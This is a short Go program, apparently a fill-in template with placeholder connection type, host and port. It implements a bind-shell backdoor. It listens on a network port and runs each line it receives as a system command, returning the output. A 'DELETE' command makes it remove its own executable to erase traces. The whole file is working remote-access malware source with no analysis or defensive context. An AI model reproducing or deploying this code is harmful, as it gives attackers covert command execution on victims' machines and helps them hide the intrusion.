package main

import (
	"net"
	"os"
	"os/exec"
	"strings"
)

func FUNC_DELETE() {
	os.Remove(os.Args[0])
}

func FUNC_HANDLE(conn net.Conn) {
	for {
		buffer := make([]byte, 1024)
		length, _ := conn.Read(buffer)
		command := string(buffer[:length-1])
		if command == "DELETE" {
			FUNC_DELETE()
			break
		}
		parts := strings.Fields(command)
		head := parts[0]
		parts = parts[1:]
		out, _ := exec.Command(head, parts...).Output()
		conn.Write(out)
	}
	// conn.Close()
}

func main() {
	listen, err := net.Listen("CONN_TYPE", "HOST:PORT")
	if err != nil {
		os.Exit(1)
	}
	defer listen.Close()
	for {
		conn, err := listen.Accept()
		if err != nil {
			os.Exit(1)
		}
		FUNC_HANDLE(conn)
	}
}
